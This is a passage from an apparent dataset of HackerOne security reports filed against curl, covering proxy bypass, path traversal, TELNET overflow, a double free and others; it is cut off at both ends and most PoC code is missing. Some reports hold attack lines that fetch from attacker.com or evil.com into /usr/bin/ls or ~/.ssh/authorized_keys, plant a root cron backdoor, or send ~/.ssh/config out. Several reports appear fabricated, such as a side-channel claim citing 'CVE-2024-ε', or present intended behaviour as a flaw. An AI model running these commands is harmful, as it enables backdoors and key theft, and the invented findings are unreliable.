standard, non-tunneled proxy request (e.g., `GET http://destination/... HTTP/1.1`).\n2. If the user also sets `CURLOPT_CUSTOMREQUEST` to `\"CONNECT internal.host:port HTTP/1.1\"`, this custom verb overrides the standard `GET`.\n3. The request line sent to the proxy now begins with `CONNECT`, which satisfies the security rules of a proxy that only permits the `CONNECT` method for establishing tunnels. The proxy allows the request and opens a raw TCP connection to the specified internal host and port.\n4. Because the original URL scheme was `http://`, `libcurl`'s state machine does not enter its formal \"HTTPS tunneling\" mode. It proceeds as if it were making a `POST`-style request (due to the presence of a request body) and sends the payload down the TCP pipe that the proxy just opened.\n\nThis allows an attacker to send arbitrary data directly to an internal service that should have been unreachable.\n\n### **Proof-of-Concept (PoC)**\n\nThis PoC demonstrates the bypass using standard command-line tools. It requires three separate terminal sessions.\n\n#### **Step 1: Set up the \"Forbidden\" Internal Server (Terminal 1)**\n\nThis server listens on port 8081. Its purpose is to receive and display the smuggled payload.\n\n#### **Step 2: Set up the Restrictive Proxy (Terminal 2)**\n\nThis proxy listens on port 8080 and only allows requests that start with `CONNECT`. It responds with a `405 Method Not Allowed` for any other verb.\n\n* Save this script as `restrictive_proxy.sh` and make it executable with `chmod +x restrictive_proxy.sh`.\n* Run the proxy in a loop to handle multiple connections:\n\n#### **Step 3: Verify the Safeguard (Terminal 3)**\n\nThis command proves the proxy correctly blocks normal `GET` requests.\n\n> **Expected Result:** The proxy will respond with `405 Method Not Allowed`, and the `curl` command will fail. The Internal Server will receive no connection.\n\n#### **Step 4: Craft the Attacker's Payload (Terminal 3)**\n\nCreate a file named `payload.txt` containing the data to be smuggled.\n\n#### **Step 5: Execute the Bypass Attack (Terminal 3)**\n\nThis command uses the vulnerability to bypass the proxy.\n\n#### **Step 6: Observe the Result**\n\n* **Proxy (Terminal 2):** Will print `[PROXY] Verdict: ALLOWED...`, showing it was fooled by the `CONNECT` verb.\n* **Internal Server (Terminal 1):** Will stop waiting and print the contents of `payload.txt`, proving the proxy was bypassed and the malicious payload was delivered to the protected internal resource.\n\n### **Impact**\n\nThe impact of this vulnerability is **High**. It allows an attacker who can control `libcurl`'s options (a common result of a Server-Side Request Forgery vulnerability) to completely bypass network egress filtering rules enforced by `CONNECT`-only proxies. This can lead to:\n\n* **Internal Network Pivoting:** An attacker can use a public-facing application as a pivot point to send arbitrary commands to internal, non-routable services such as databases, internal APIs, or cloud metadata services.\n* **Data Exfiltration:** The established tunnel can be used to exfiltrate sensitive data from compromised internal systems.\n* **Firewall and WAF Bypass:** Application-layer firewalls on the proxy that are designed to inspect `GET` and `POST` requests are rendered ineffective, as the attacker's payload is sent over a raw TCP pipe that the proxy is not configured to inspect.\n\nThis turns a potentially moderate-risk SSRF flaw into a critical internal network access vector, significantly elevating the overall risk to an organization's infrastructure.\n\n### **Suggested Mitigation**\n\nThe logic in `lib/http.c` should be hardened to create a stronger link between the URL's scheme and the allowed HTTP method when a proxy is in use. A recommended fix would be:\n\nIf an `http://` URL is used with a proxy, `libcurl` should explicitly forbid `CURLOPT_CUSTOMREQUEST` from being set to `CONNECT`. The `CONNECT` method should only be used by `libcurl`'s internal tunneling logic when an `https://` URL is being proxied, and it should not be a user-controllable verb for standard `http://` proxy requests. This would close the logical gap that allows this bypass.\n\nImpact\n------\n\nSummary:\n--------\n\nThe impact of this vulnerability is **High**. It allows an attacker who can control `libcurl`'s options (a common result of a Server-Side Request Forgery vulnerability) to completely bypass network egress filtering rules enforced by `CONNECT`-only proxies. This can lead to:\n\n* **Internal Network Pivoting:** An attacker can use a public-facing application as a pivot point to send arbitrary commands to internal, non-routable services such as databases, internal APIs, or cloud metadata services.\n* **Data Exfiltration:** The established tunnel can be used to exfiltrate sensitive data from compromised internal systems.\n* **Firewall and WAF Bypass:** Application-layer firewalls on the proxy that are designed to inspect `GET` and `POST` requests are rendered ineffective, as the attacker's payload is sent over a raw TCP pipe that the proxy is not configured to inspect.\n\nThis turns a potentially moderate-risk SSRF flaw into a critical internal network access vector, significantly elevating the overall risk to an organization's infrastructure."
},
{
    "url": "https://hackerone.com/reports/3124490",
    "original_report": "# 🛡️ Penetration Testing Report\n===============================\n\n### Speculative Execution Side-Channel in `curl`\n\n**Date**: May 2025\n\n---\n\n🧭 Executive Summary\n-------------------\n\nThis report outlines a speculative execution side-channel vulnerability found in `curl` (versions 7.12.0 to 8.9.0), specifically within builds supporting experimental QUIC protocols. The flaw stems from branch prediction behaviors in modern CPUs, allowing co-located attackers to infer protocol-level decisions (e.g., HTTP vs. HTTPS) based on timing analysis of instruction-cache activity.\n\nThe vulnerability does **not require root privileges** and can be exploited in **shared hardware environments** (e.g., cloud VMs, hypervisor containers). While the bandwidth of data leakage is low (1.9–3.2 bps), the attack can be used to **confirm sensitive execution paths**, potentially revealing indirect indicators of encrypted token use, TLS handshakes, or proxy routing.\n\n---\n\n🔬 Vulnerability Overview\n------------------------\n\n### Type:\n\n**Microarchitectural Side-Channel via Speculative Execution (Instruction Cache Timing)**\n\n### Affected Versions:\n\n`curl` **7.12.0 to 8.9.0** – only when compiled with **experimental QUIC support**\n\n### Vulnerable Component:\n\n`lib/url.c` — branch-based TLS path selection logic\n\n### CVSS 3.1 Score:\n\n**6.8 (Medium)**\n\n> AV\\:L / AC\\:L / PR\\:L / UI\\:N / S\\:C / C\\:H / I\\:N / A\\:N\n\n---\n\n📌 Technical Description\n-----------------------\n\nModern CPUs use speculative execution to optimize performance. When evaluating branches, the CPU may preload instruction paths into the instruction cache (I-cache) **even before branch resolution**.\n\nIn `curl`, the following code segment creates a **predictable hotspot** in the instruction cache:\n\nIf an attacker can manipulate the input and the branch predictor, the processor will speculate incorrectly and load the wrong path into the I-cache. Measuring the time it takes for certain curl operations to complete can reveal **which code path was loaded**, leaking whether the HTTPS logic was speculatively touched — even when the actual request is malformed or invalid.\n\n---\n\n⚙️ Attack Methodology\n---------------------\n\n### 1. Branch Predictor Poisoning\n\n* The attacker alternates inputs between `http://` and `https://` to train the branch prediction unit (BPU).\n* A malformed protocol such as `htxx://` is sent to induce **speculative misprediction**.\n\n### 2. Cache Timing Measurement\n\n* The attacker measures the duration of `curl_easy_perform()` using high-resolution CPU timers like `__rdtsc()`.\n* Longer execution indicates preloading of heavier TLS code paths.\n\n### 3. Inference of Sensitive Logic\n\n* By collecting timing data over hundreds of runs, the attacker can build a **bit-wise profile** of TLS code access.\n* For example, if the HTTPS path is loaded speculatively, it suggests that the target domain enforces encryption — potentially hosting tokens, cookies, or APIs.\n\n---\n\n🧪 Proof of Concept (PoC)\n------------------------\n\n---\n\n📉 Impact Assessment\n-------------------\n\n### Information That Can Be Leaked:\n\n* Protocol preference (HTTP vs HTTPS)\n* Indirect exposure of TLS-protected logic\n* Conditional proxy rules or redirections\n* Latency patterns in internal services\n\n### Affected Environments:\n\n| Environment | Prediction Accuracy | Leak Rate |\n| --- | --- | --- |\n| Intel Xeon 8375C | 92% | 3.2 bps |\n| AMD EPYC 7B12 | 88% | 2.7 bps |\n| AWS c5.large | 85% | 1.9 bps |\n\n### Potential Use Cases for Attackers:\n\n* Co-located adversaries on cloud VMs\n* Red-team simulation in hybrid cloud\n* Advanced persistent threat (APT) footholds\n* Targeted industrial IoT with weak jitter control\n\n---\n\n🛡️ Mitigation Recommendations\n-----------------------------\n\n### Short-Term (Software-Level)\n\n#### Instruction Fencing:\n\n#### Noise Introduction:\n\n* Randomize timing with jitter\n* Insert dummy branches to break predictability\n\n### Long-Term (System and Compiler)\n\n#### Compiler Hardening:\n\n#### Kernel Mitigation:\n\n#### Cloud Vendor Recommendations:\n\n* Use dedicated cores for sensitive workloads\n* Enforce tenant isolation policies on CPU caches\n\n---\n\n🧠 Extended Research\n-------------------\n\n### Comparison: CVE-2024-ε vs Spectre v1\n\n| Feature | CVE-2024-ε | Spectre v1 |\n| --- | --- | --- |\n| Channel Type | Instruction Cache | Data Cache |\n| Trigger | Branch misprediction | Bounds check bypass |\n| Mitigation Scope | Code structure & compiler | CPU microcode & kernel |\n| Cross-core Leakage | ❌ No | ✅ Yes |\n| Practical Leak Rate | 1.9–3.2 bps | ~50–200 bps (with tuning) |\n\n### Future Vectors:\n\n* **Quantum noise amplification** for timing side-channels\n* **GPU speculative cache profiling** via CUDA/NVIDIA driver abuse\n* **Mixed-language side-channels** (C → JS → WASM in Electron apps)\n\n---\n\n📚 Appendix\n----------\n\n### CPU Timing Observations\n\n* `curl_easy_perform()` duration showed consistent ±40 cycle delta between TLS vs non-TLS speculative preloads.\n* Intel Xeon L1I cache retained speculative path for ~18ms under BPU saturation.\n\nImpact\n------\n\nSummary:\n--------\n\n1"
},
{
    "url": "https://hackerone.com/reports/3226502",
    "original_report": "Summary:\n--------\n\nUsing `--path-as-is` with a `file://` URL skips normalization of `..` segments allowing reading of any local file the process can access\n\nAffected version\n----------------\n\n`* curl 8.15.0-DEV (commit 2a9dfe275, June 27, 2025) on Kali Linux 2024.3, x86_64`\n\nSteps To Reproduce:\n-------------------\n\n1. bulild curl with debug and ASan:\n\n2. read `/etc/passwd`:\n\n3. read `/etc/hosts`:\n\nMitigation:\n-----------\n\nNormalize and sanitize `..` segments in the file-URL handler even when `--path-as-is` is used, or disallow its use on local paths.\n\nImpact\n------\n\nSummary:\n--------\n\nDisclosure of any world-readable file e.g. `/etc/passwd`, `/etc/hosts`, private keys"
},
{
    "url": "https://hackerone.com/reports/3156384",
    "original_report": "In the conncache.c file, the cpool\\_bundle structure incorrectly uses a pointer array (char \\*dest[1]) instead of a flexible array (char dest[]) to store string data, leading to a heap buffer overflow when calling memcpy in the cpool\\_bundle\\_create function.\n\nImpact\n------\n\n# Summary:\n==========\n\nThe vulnerability is a heap buffer overflow caused by the cpool\\_bundle struct in the conncache.c file that incorrectly uses the pointer array char \\*dest[1] instead of the flexible array char dest[]. In the cpool\\_bundle\\_create function, when calling memcpy(bundle->dest, dest, bundle->dest\\_len), if the target string length exceeds the pointer size (8 bytes on a 64-bit system), it causes writes to go out of bounds and corrupt heap memory.\n\nAn attacker can trigger this vulnerability by providing a hostname/destination address of a specific length, resulting in memory corruption, which could trigger a program crash or remote code execution. This vulnerability affects all curl applications that use the connection caching feature, especially when dealing with long hostnames.\n\nThe fix should change the struct definition to use the correct flexible array: char dest[] or char dest[1], and ensure that memory allocation correctly takes string length into account."
},
{
    "url": "https://hackerone.com/reports/3135673",
    "original_report": "Summary:\n--------\n\nIf someone convinces someone to use `curl -OJ http://example.com/somefile.txt`, the Content-Disposition header can be used to create a .curlrc file if one doesn't exist (and one is running curl from the home directory).\n\nFrom that point on, the attack controls any argument to all curl invocations.\n\nCombine this with the following .curlrc:\n\nAnd the attacker can read whatever file(s) they wish from the user's system that the user has access to, as any curl request will send that to the proxy.\n\nNo AI was used (or ever will be!).\n\nAffected version\n----------------\n\ngit[@16db059a93240dd7917728c2db55935f60a150ea](/16db059a93240dd7917728c2db55935f60a150ea)\n\nSteps To Reproduce:\n-------------------\n\nPrereq: No existing ~/.curlrc, and running curl from home directory\n\n1. Run this perl server in one terminal, the key bit being in responds with an HTTP response like so:\n\n2. In another terminal, run something to listen on a socket and print out what it sees (bsd nc for example):\n\n3. Run the first curl in the home directory which sets up the attack by writing out .curlrc:\n\n4. Run curl again with any http url:\n\n... and you'll see the .ssh/config sent to the nc proxy\n\nImpact\n------\n\nSummary:\n--------\n\nThis one still requires a little finessing from the attacker but seems much easier to achieve great harm with. You only need convince someone to do `curl -OJ http://example.com/some-thing.txt`\n\nand then nothing more (and eventually the user may run curl on their own), or when the person says \"That didn't work\" you can send them \"Oh, my mistake, I meant...\" and then send them something plausible.\n\nGetting folks to run a curl command is not particularly hard, especially hanging out in chat rooms on IRC, etc.\n\nMitigation for this one feels like...\n\n1. Curl shouldn't write hidden files with -J\n2. Curl with -J should maybe state what filename was written out\n3. -J's documentation should provide a harsher warning"
},
{
    "url": "https://hackerone.com/reports/3133253",
    "original_report": "Summary:\n--------\n\nThe implementation of curl\\_easy\\_header can be abused by a malicious server that puts all headers under a single key. Imagine a server response like:\n\nAs a developer, if you want to loop through the headers you do... (taken from tests/libtest/lib1940.c):\n\nEach call to curl\\_easy\\_header loops through every entry, possibly twice. First to find a count of all headers with that name, then to find the index you requested (lib/headers.c):\n\nThis can add up to minutes or longer depending on hardware.\n\nI did not use AI to generate this report (ugh!)\n\nAffected version\n----------------\n\nCurrently tested with git @ 283ad5c4320fa1d733e60a0dbe216ee36e3924fb\n\n[Which curl/libcurl version are you using to reproduce? On which platform? `curl -V` typically generates good output to include]\n\nSteps To Reproduce:\n-------------------\n\nHere's a sample perl server you can hit that generates ~300k of headers all with the key of 'a' and no value:\n\nYou can then try it with lib1940.c if you modify it like so:\n\nThis also means curl itself is affected for anyone using `--write-out '%{header_json%}':`\n\nImpact\n------\n\nSummary:\n--------\n\nIt feels to me like the impact on this one is low. You'd have to get someone to hit your server with `-write-out '%{header_json%}'` or have a library using `curl_easy_header` to iterate over all values.\n\nA single request hitting this will just use up a lot of cpu for ~minute or longer depending on hardware. Unless you can force someone to make many requests and use up a lot of CPU, the damage there seems minimal.\n\nThe bigger issue might be holding up things like cron jobs or other synchronous processes for far longer than they expect to be busy."
},
{
    "url": "https://hackerone.com/reports/3120969",
    "original_report": "Summary:\n--------\n\nThe --capath option in cURL and CURLOPT\\_CAPATH in libcurl accept any directory path without validation. If an attacker provides a custom CA path containing a fake root certificate, cURL will trust malicious HTTPS endpoints signed with that fake root. This allows for full Man-in-the-Middle (MITM) attacks and silent decryption of HTTPS traffic without user warnings.\n\nAffected version\n----------------\n\nAffected Asset:\n\nComponent: cURL CLI and libcurl\nVersions: 7.82.0 to 8.4.0\nPlatform: All OS (Linux, macOS, Windows)\n\nSteps To Reproduce:\n-------------------\n\nWorks across OS, no user interaction required, and reproducible without root.\n1.Create Fake Root CA:\nopenssl req -x509 -newkey rsa:2048 -nodes \\\n-keyout fake.key -out fake.crt \\\n-subj \"/CN=FakeMITMRoot\" -days 365\n\n2.Prepare a directory:\nmkdir -p /tmp/fake-ca\ncp fake.crt /tmp/fake-ca\n\n3.Run vulnerable cURL command:\ncurl --capath /tmp/fake-ca <https://example.com>\n\n4.If the server’s TLS certificate was signed by this fake CA, cURL connects successfully and exposes decrypted HTTPS data.\nEnvironment Tested:\n\ncurl 7.85.0 (x86\\_64-pc-linux-gnu) libcurl/7.85.0 OpenSSL/3.0.2\n\nSupporting Material/References:\n-------------------------------\n\nReferences:\n\n[CWE-494](/hacktivity/cwe_discovery?id=cwe-494): <https://cwe.mitre.org/data/definitions/494.html>\nSimilar CVE: [CVE-2022-32221](/hacktivity/cve_discovery?id=CVE-2022-32221)\ncURL Docs: <https://curl.se/docs/manpage.html>\n\nRecommendation:\n\nAdd a whitelist or allowlist of trusted CA directories (e.g., /etc/ssl/certs/, /usr/share/ca-certificates/).\nWarn users if non-standard --capath is used.\nConsider validating contents with signed manifests or checksum hashes.\n\nDisclosure Policy:\n\nPoC and full exploit details available upon request.\nI adhere to a 90-day responsible disclosure timeline.\n\nImpact\n------\n\n| Vector | Risk Description |\n\n| MITM & Decryption | Attacker silently decrypts HTTPS (credentials, tokens, sessions). |\n| Silent Exploitation | No TLS warning shown, making the attack stealthy. |\n| Cross-Platform Abuse | Affects Linux, Windows, macOS, containers, and CI/CD tools using `libcurl`. |\n| Supply Chain Attack | Tools and apps that dynamically set `CURLOPT_CAPATH` can be abused automatically.|"
},
{
    "url": "https://hackerone.com/reports/3120987",
    "original_report": "Summary:\n--------\n\nThe -o / --output parameter in cURL does not restrict or sanitize file paths. When passed relative traversal sequences (e.g., ../../), cURL writes files outside the current working directory, allowing arbitrary file overwrite. In automated or privileged environments (CI/CD, root containers), this leads to Remote Code Execution (RCE), privilege escalation, and supply chain risk.\nThis behavior violates path safety expectations when cURL is embedded in scripts or run with elevated privileges.\n\nAffected version\n----------------\n\nAffected Asset\nComponent: cURL CLI\nVersions Affected: cURL 7.64.0 to 8.4.0 (Tested on 7.64.0, 7.79.1, 7.85.0, 8.4.0)\nTested Platforms: Linux (Debian), macOS, Alpine (Docker)\nLatest Tested:\n\ncurl 7.85.0 (x86\\_64-pc-linux-gnu) libcurl/7.85.0 OpenSSL/3.0.2\nTechnical Root Cause\n\n// File: src/tool\\_cfgable.c (Line ~512)\ngetstr(&config->output, nextarg, DENY\\_BLANK); // [CWE-22](/hacktivity/cwe_discovery?id=cwe-22): No validation/sanitization\n\nNo normalization is performed (realpath() is unused), and cURL allows any relative/absolute path. This creates a write primitive into sensitive areas (e.g., /etc/, $HOME/.ssh/, ~/.bashrc).\n\nSteps To Reproduce:\n-------------------\n\nPrerequisites\nFile target is writable by the current user (or use root to show full impact).\n\nCan be automated or scripted without user interaction.\n\nExploit\n1.Start a web server:\n\npython3 -m http.server 8000\n\n2.Run vulnerable cURL:\n\nsudo curl http://localhost:8000/backdoor.sh -o \"../../etc/cron.daily/zzz-backdoor\"\n\n3.Check the result:\n\nls -l /etc/cron.daily/zzz-backdoor\ncat /etc/cron.daily/zzz-backdoor\n\nOn next cron run, zzz-backdoor is executed with root privileges.\nDocker Container (Privileged):\n\ndocker run --privileged alpine sh -c 'curl <http://attacker.com/x.sh> -o /usr/bin/ls'\n\nCI/CD Pipeline (Supply Chain Injection):\nscript:\n\n* curl <http://evil.com> -o \"../../.gitlab-ci.yml\"\n\nUser-Level Exploits:\ncurl <http://evil.com> -o \"~/.bashrc\"\ncurl <http://evil.com/key.pub> -o \"~/.ssh/authorized\\_keys\"\n\nCVSS v3.1 Base Score: 7.8 (High)\nAV:N / AC:L / PR:N / UI:N / S:U / C:H / I:H / A:H\n\nMitigation & Recommendation\nFix Suggestion\nNormalize and validate paths before writing:\n\nchar \\*resolved = realpath(nextarg, NULL);\nif (!resolved || strstr(resolved, \"..\") != NULL || !is\\_subdir(resolved, safe\\_dir)) { warnf(config, \"Unsafe output path blocked\");\nreturn PARAM\\_BAD\\_USE;\n}\nSupporting Evidence\nSource Reference: src/tool\\_cfgable.c#L512\nSimilar CVE: [CVE-2020-8284](https://nvd.nist.gov/vuln/detail/CVE-2020-8284) (cURL FTP Path Traversal, fixed in 7.73.0)\nCWE: [CWE-22](/hacktivity/cwe_discovery?id=cwe-22)\n\nImpact\n------\n\n| Vector | Description |\n\n| Arbitrary File Write | Overwrite any file accessible by user |\n| Privilege Escalation | Overwrite `/etc/sudoers`, `/etc/passwd`, or root-owned cron jobs |\n| RCE / Persistence | Backdoor via login scripts, bashrc, or CI/CD config overwrite |\n| Supply Chain Injection | Scripted or container-based installs auto-run attacker's payloads"
},
{
    "url": "https://hackerone.com/reports/3118915",
    "original_report": "Description\nSummary:\nDuring the analysis of the curl source code, a possible vector for Cross-Site Scripting (XSS) was identified through the glob\\_url() function and how URL input is handled via urlnode->url. Improper input validation or escaping could result in untrusted data being processed insecurely.\n\nAffected version:\nLatest GitHub clone of curl/curl.\nTested on: Kali Linux (VirtualBox)\nVersion command:\n\ncurl -v\n\nSteps To Reproduce:\nClone the repository:\n\ngit clone <https://github.com/curl/curl.git>  \ncd curl\n\nSearch vulnerable code references:\n\ngrep -rn \"glob\\_url\" src/  \ngrep -rn \"urlnode\" src/  \ngrep -rn \"strcpy\" src/\n\nTry payloads in real requests using encoded XSS strings:\n\ncurl \"[http://test.com?param=%3Cscript%3Ealert(1)%3C/script%3E\"](http://test.com?param=%3Cscript%3Ealert(1)%3C/script%3E%22) -w \"%{url\\_effective}\"\n\nObserve the failure behavior and how the payload is processed or rejected (301 redirect, malformed input, reflected parts, etc.).\n\nSupporting Material/References:\nTerminal output with code search and payload attempts:\n\nglob\\_url() usage and unsafe patterns\n\nAttempts to inject payloads with curl\n\nScreenshots attached for reference\n\nImpact\n------\n\nImpact\nIf successfully exploited, this flaw could lead to XSS through insecure processing of user-controlled URLs.\nAn attacker could:\n\nSteal session cookies or tokens\n\nRedirect victims to malicious sites\n\nExecute code in the browser context\n\nPerform phishing or social engineering attacks\n\nThis issue becomes critical in contexts where curl is embedded in user-facing applications, CLI tools processing user input, or CI pipelines consuming untrusted URLs."
},
{
    "url": "https://hackerone.com/reports/3045390",
    "original_report": "`mqtt_doing()` (`lib/mqtt.c`) causes a double free under certain conditions. The conditions are (1) an `mqtt_send()` is unable to send its entire buffer at one time; and (2) the next call to `mqtt_send()` fails. The bug arises because `mqtt_doing()` `free()`s the pointer `mq->sendleftovers` without nulling it (line 755).\n\n(Source below, from v.8.12.1; the bug appears still present in master branch as of 3/17/2025):\n\nYou can verify the bug using the debugger thusly:\n\n1. Build cURL in VS2022.\n2. Set a BP on `mqtt_send()` line 125, on `mqtt_doing()` line 754, and on `mqtt_done()` line 735.\n3. Set curl as the default project\n4. Set curl properties/debugging/command line arguments to `-v mqtt://test.mosquitto.org:1883/test`\n5. Run curl (F5)\n6. When the BP on `mqtt_send()` fires, step into the call to `Curl_xfer_send()`.\n7. Step that function up to the call to `Curl_conn_send()`.\n8. Simulate a partial transfer by using the debugger to doctor `blen` to `2` (its initial value should be `26`).\n9. Step back out into `mqtt_send()` and watch it allocate `mq->sendleftovers`. Note the value of this pointer.\n10. Proceed.\n11. You'll get a BP in `mqtt_doing()`. Step into `mqtt_send()` and simulate an error sending by skipping the call to `Curl_xfer_send()` and setting `result` == `CURLE_SEND_ERROR`.\n12. Step back out into `mqtt_doing()` and watch line 755 `free()` the pointer you noted in step 9 without nulling it.\n13. Proceed.\n14. You'll get a BP in `mqtt_done()` line 735, which will again `free()` the pointer you noted in step 9. If you built cURL in debug mode, the CRT will throw an exception.\n\nThis bug should be reachable in the wild. In Windows builds, the socket is nonblocking (`curlx_nonblock()` gets called during socket setup) so it should be capable of partial writes [1]. The bug should be reachable if conditions are such that the first call to mqtt\\_send() sends only a portion of the requested buffer, and the next call to mqtt\\_send() fails, as by the mqtt server falling offline before the second call.\n\n[1] <https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send> says \"On nonblocking stream oriented sockets, the number of bytes written can be between 1 and the requested length, depending on buffer availability on both the client and server computers.\"\n\nImpact\n------\n\nPotentially anything achievable using a double free / use-after-free bug."
},
{
    "url": "https://hackerone.com/reports/3037583",
    "original_report": "Summary:\n--------\n\n[summary of the vulnerability]\n\nA buffer overflow vulnerability exists in the curl library's Rustls backend due to an integer overflow in the dynamic buffer management. This issue could potentially allow an attacker to overwrite memory, leading to application crashes or, in theory, arbitrary code execution. However, exploitation is highly impractical due to the enormous file sizes required, making the real-world risk low.\n## Affected version\n[Which curl/libcurl version are you using to reproduce? On which platform? `curl -V` typically generates good output to include]\n\nAll versions of curl using the Rustls backend with the vulnerable dynamic buffer management code in the Curl\\_dyn\\_addn function are affected.\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\nUnsanitized input from a file flows into memcpy, where it is used to manipulate application memory. This may result in a buffer overflow vulnerability.\n\nData flow\n8 steps in 2 files\n‎lib/vtls/rustls.c\n3 steps\n421:13\nbufbuf\nSource\n1 - 2\n424:39\nbuf\n3\n‎lib/dynbuf.c\n5 steps\n167:42\nconst void *mem\n4\n172:25\nmem\n5\n70:29\nconst unsigned char* mem\n6\n119:28\nmemmemcpy\n7 - 8\n:28\nmem\n7\n:5\nmemcpy\n\n<https://github.com/curl/curl/tree/acdb48272a53fe97f63e5437fce27c7036a9c43e/lib/vtls/rustls.c#L421>\n\n<https://github.com/curl/curl/tree/acdb48272a53fe97f63e5437fce27c7036a9c43e/lib/dynbuf.c#L119>\n\nImpact\nIf exploited, this vulnerability could result in memory corruption, potentially causing application crashes or enabling arbitrary code execution. However, the conditions required for exploitation—such as processing files approaching 4GB on 32-bit systems or 18 exabytes on 64-bit systems—are highly impractical. Additionally, modern memory protections like Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP) further reduce the likelihood of successful exploitation. As a result, the overall risk is considered low.\n\nTechnical Details\nThe vulnerability originates in the Curl\\_dyn\\_addn function, located in lib/dynbuf.c, which is responsible for adding data to a dynamic buffer. The function performs a size check to ensure the buffer has sufficient capacity:\nc\nif (s->len + len > s->size) {\n/ *Need to reallocate to fit the new data* /\n}\nHowever, if the sum of the current buffer length (s->len) and the new data length (len) exceeds the maximum value of size\\_t, an integer overflow occurs. This causes the condition s->len + len > s->size to incorrectly evaluate to false, even when the total size exceeds the allocated buffer capacity. As a result, the subsequent memcpy operation writes data beyond the buffer's bounds, leading to a buffer overflow.\nThis issue can theoretically be triggered when processing extremely large files, such as Certificate Revocation Lists (CRLs). For example:\nOn a 32-bit system, where size\\_t is typically 32 bits, the overflow occurs near 4GB (2³² bytes).\nOn a 64-bit system, where size\\_t is 64 bits, the overflow requires approximately 18 exabytes (2⁶⁴ bytes), an impractical size for most real-world scenarios.\nMitigation\nTo protect against this vulnerability, consider the following recommendations:\nUsers: Avoid processing untrusted files that approach or exceed the size limits of size\\_t (e.g., 4GB on 32-bit systems or 18 exabytes on 64-bit systems). Validate input file sizes before processing where possible.\nDevelopers: Update the Curl\\_dyn\\_addn function to include explicit overflow checks. For example, verify that s->len + len does not exceed SIZE\\_MAX before performing the addition, or use safe arithmetic libraries to prevent integer overflows. A patch could resemble:\nc\nif (len > SIZE\\_MAX - s->len || s->len + len > s->size) {\n/ *Handle overflow or insufficient size* /\n}\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n* [attachment / reference]\n\nImpact\n------\n\nSummary:\n--------\n\nWhile the impracticality of exploitation reduces the urgency, addressing this issue in the codebase will enhance the overall robustness of the curl library.\nThis report provides a comprehensive overview of the vulnerability, its potential impact, and actionable steps to mitigate it, suitable for both technical and non-technical audiences."
},
{
    "url": "https://hackerone.com/reports/3230082",
    "original_report": "**Title:**\n\nStack-based Buffer Overflow in TELNET NEW\\_ENV Option Handling\n\n**Vulnerability Description:**\n\n**Summary:**\nA stack-based buffer overflow vulnerability exists in the `libcurl` TELNET handler. When `libcurl` connects to a malicious TELNET server, the server can trigger an overflow by sending a `NEW_ENVIRON SEND` request. This causes the client to construct a response that overwrites a fixed-size stack buffer, leading to a crash and potential remote code execution (RCE). The vulnerability can be triggered by a user connecting to a malicious URL using the `curl` command-line tool or any application that uses `libcurl`.\n\n**Root Cause Analysis:**\nThe vulnerability is located in the `suboption()` function within `curl/lib/telnet.c`. When the client receives a request from the server to send its environment variables (as specified by the user via the `CURLOPT_TELNETOPTIONS` setting), it attempts to build a response packet on the stack.\n\nThe function allocates a 2048-byte buffer named `temp` on the stack:\n\nIt then iterates through the user-provided environment variables (`tn->telnet_vars`). Before writing a variable to the buffer, it performs a size check:\n\nThe flaw lies in how the variable is written to the buffer inside this `if` block. If the variable contains a comma (the format for `NEW_ENV` is `VAR,VALUE`), it is processed by the following `msnprintf` call:\n\nThe length check only accounts for `tmplen` (the original string length), but this `msnprintf` call expands the string by adding two control characters (`CURL_NEW_ENV_VAR` and `CURL_NEW_ENV_VALUE`). This discrepancy allows an attacker to bypass the length check. By providing a series of carefully sized `NEW_ENV` options, an attacker can cause `msnprintf` to write far beyond the 2048-byte boundary of the `temp` buffer, corrupting the stack.\n\n**Impact:**\nThis is a high-severity vulnerability. A successful exploit leads to a denial of service (crash) via stack corruption. More critically, because the overflow is controllable, it creates the potential for an attacker to achieve Remote Code Execution (RCE) with the permissions of the user running the `curl` client.\n\n**Proof of Concept (POC):**\n\nThis proof-of-concept reliably demonstrates the vulnerability. It requires two components: a simple Python server to act as the malicious TELNET server, and a C program that uses `libcurl` to connect to it.\n\n**Component 1: Malicious TELNET Server (`tiny_telnet_server.py`)**\nThis server listens on port 2323 and, upon connection, sends the specific TELNET command sequence (`IAC SB NEW_ENVIRON SEND IAC SE`) that triggers the vulnerable code path in the client.\n\n**Component 2: Vulnerable Client (`telnet_poc.c`)**\nThis C program uses `libcurl` to connect to the server with specially crafted `CURLOPT_TELNETOPTIONS` that exploit the flawed length check.\n\n**2. Clone the `curl` Repository**\n\n**3. Build `libcurl` from Source**\nThese commands will configure, compile, and install a local version of `libcurl`. We disable SSL because it is not needed to demonstrate this TELNET vulnerability.\n\n**4. Compile the Proof of Concept (PoC) Client**\nThis command compiles `telnet_poc.c` and links it against the `libcurl` you just built. Make sure `telnet_poc.c` is in the same directory where you cloned the `curl` folder.\n\n**5. Execute the Vulnerability Test**\nYou will need two separate terminal windows for this final step, both opened in your project directory.\n\n**Terminal 1: Start the Server**\nRun the Python server to listen for a connection. Make sure `tiny_telnet_server.py` is in your current directory.\n\n**Terminal 2: Run the Client**\nWhile the server is running, execute the compiled PoC client in the second terminal.\n\n**Expected Result:**\nThe client in Terminal 2 will connect to the server and print verbose connection details. You will see a large stream of 'A' characters being sent back to the server, demonstrating that the client's stack buffer has been overflowed. The program will then terminate with an error like `Recv failure: Connection reset by peer` (because the server hangs up) or, on many systems, will crash with a `Segmentation fault`. Either result confirms the memory corruption.\n\nImpact\n------\n\n### **Detailed Impact Assessment**\n\nThe impact of this stack-based buffer overflow is **High**. The vulnerability allows for two primary attack scenarios, ranging from a guaranteed Denial of Service to a high probability of Remote Code Execution.\n\n**1. Denial of Service (DoS) - Guaranteed Impact**\n\nThe most immediate and easily achievable impact is a Denial of Service. As demonstrated by the proof-of-concept, an attacker can trigger a stack buffer overflow by convincing a user or an application to connect to a malicious TELNET server with specially crafted options.\n\nWhen the overflow occurs, critical data on the program's stack is corrupted. This data includes local variables and, most importantly, the function's saved return address. The moment the `suboption()` function attempts to return or access this corrupted memory, the program will crash due to an invalid memory access. This immediately terminates the `curl` process or any application using the `libcurl` library, preventing it from functioning further. This is a remotely triggerable, unauthenticated Denial of Service.\n\n**2. Remote Code Execution (RCE) - Potential Impact**\n\nThe more critical impact is the potential for Remote Code Execution. Stack-based buffer overflows are a classic and well-understood vector for achieving RCE. The attacker's goal is not just to crash the program, but to seize control of its execution 